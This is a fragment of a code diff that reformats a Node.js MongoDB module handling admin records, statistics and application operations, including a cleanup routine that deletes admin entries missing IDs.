+        const statsPromises = admins.map(async admin => {
+            const stats = await getAdminStats(admin.adminId);
+            return {
+                adminId: admin.adminId,
+                name: admin.name,
+                role: normalizeRole(admin.role),
+                status: admin.status,
+                ...stats
+            };
+        });
+        return await Promise.all(statsPromises);
     } catch (error) {
-
-        console.error(
-            '❌ Error getting per-admin stats:',
-            error
-        );
-
+        console.error('❌ Error getting per-admin stats:', error);
         return [];
     }
 }
 
 // ==================================================
-// DEBUG / MAINTENANCE
+// MAINTENANCE & DEBUG
 // ==================================================
 
 async function getAllAdminsDetailed() {
-
     try {
-
-        const admins =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            )
-            .find({})
-            .sort({
-                createdAt: -1
-            })
-            .toArray();
-
-        console.log(
-            `📊 Found ${admins.length} admins`
-        );
-
-        admins.forEach(admin => {
-
-            console.log(
-
-                `   ${admin.adminId}: ` +
-                `${admin.name} ` +
-                `(role: ${normalizeRole(admin.role)}, ` +
-                `status: ${admin.status})`
-
-            );
-
-        });
-
-        return admins.map(
-            admin => ({
-
-                ...admin,
-
-                role:
-                    normalizeRole(
-                        admin.role
-                    )
-            })
-        );
-
+        const admins = await db.collection(COLLECTIONS.ADMINS).find({}).sort({ createdAt: -1 }).toArray();
+        return admins.map(admin => ({
+            ...admin,
+            role: normalizeRole(admin.role)
+        }));
     } catch (error) {
-
-        console.error(
-            '❌ Error getting detailed admins:',
-            error
-        );
-
+        console.error('❌ Error getting detailed admins:', error);
         return [];
     }
 }
 
-// ==================================================
-// CLEAN INVALID ADMINS
-// ==================================================
-
 async function cleanupInvalidAdmins() {
-
     try {
-
-        const result =
-            await db.collection(
-                COLLECTIONS.ADMINS
-            ).deleteMany({
-
-                $or: [
-
-                    {
-                        adminId:
-                            { $exists: false }
-                    },
-
-                    {
-                        adminId:
-                            null
-                    },
-
-                    {
-                        adminId:
-                            ''
-                    },
-
-                    {
-                        chatId:
-                            { $exists: false }
-                    },
-
-                    {
-                        chatId:
-                            null
-                    }
-
-                ]
-            });
-
-        console.log(
-            `🧹 Cleaned ${result.deletedCount} invalid admin(s)`
-        );
-
+        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
+            $or: [
+                { adminId: { $exists: false } },
+                { adminId: null },
+                { adminId: '' },
+                { chatId: { $exists: false } },
+                { chatId: null }
+            ]
+        });
+        console.log(`🧹 Cleaned ${result.deletedCount} invalid admin(s)`);
         return result;
-
     } catch (error) {
-
-        console.error(
-            '❌ Error cleaning invalid admins:',
-            error
-        );
-
+        console.error('❌ Error cleaning invalid admins:', error);
         throw error;
     }
 }
@@ -1631,16 +569,10 @@ async function cleanupInvalidAdmins() {
 // ==================================================
 
 module.exports = {
-
-    // Database
     connectDatabase,
     closeDatabase,
-
-    // Roles
     ROLES,
     normalizeRole,
-
-    // Admin operations
     saveAdmin,
     getAdmin,
     getAdminByChatId,
@@ -1654,20 +586,14 @@ module.exports = {
     isSuperAdmin,
     ensureSuperAdmin,
     migrateAdminRoles,
-
-    // Application operations
     saveApplication,
     getApplication,
     updateApplication,
     getApplicationsByAdmin,
     getPendingApplications,
-
-    // Statistics
     getAdminStats,
     getStats,
     getPerAdminStats,
-
-    // Maintenance
     getAllAdminsDetailed,
     cleanupInvalidAdmins
 };
